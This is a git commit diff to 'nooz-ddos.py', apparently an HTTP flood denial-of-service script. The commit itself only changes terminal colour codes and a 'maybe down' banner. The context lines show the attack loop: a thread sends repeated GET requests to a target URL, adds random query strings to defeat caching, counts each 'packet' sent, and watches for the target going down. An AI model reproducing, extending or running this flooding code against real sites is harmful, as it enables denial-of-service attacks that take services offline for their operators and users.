38e6fa917208c61712baa736bf1e7d990a4dc621
panjihitam <227722544+panjihitam855@users.noreply.github.com>
2025-08-21 22:59:23 +0700

    Update nooz-ddos.py

--- nooz-ddos.py
+++ nooz-ddos.py
@@ -93,10 +93,10 @@ class httpth1(threading.Thread):
                 randomized_url = url + "?" + genstr(random.randint(3, 10))
                 requests.get(randomized_url, headers=headers)
                 u += 1
-                print("[*]  \033[96mN0ZZ --> \033[32m " +str(u)+ "   \033[33mSend the packet  \033[31m " +url+ "\033[0m" )  
+                print("[*]  \033[96mN0ZZ --> \033[32m " +str(u)+ "   \033[33mSend the packet  \033[97m " +url+ "\033[0m" )  
                 print("[*]  \033[93mN0ZZ --> \033[37m " +str(u)+ "   \033[35mSend the packet  \033[33m " +url+ "\033[0m" )      
             except requests.exceptions.ConnectionError:
-                print("[-]  \033[31m--–--------------------–------maybe down--––------––--––--------------------\033[0m" )
+                print("[-]  \033[31m--–---------------------maybe down--––------––--––------------\033[0m" )
                       
                 pass
             except requests.exceptions.InvalidSchema:
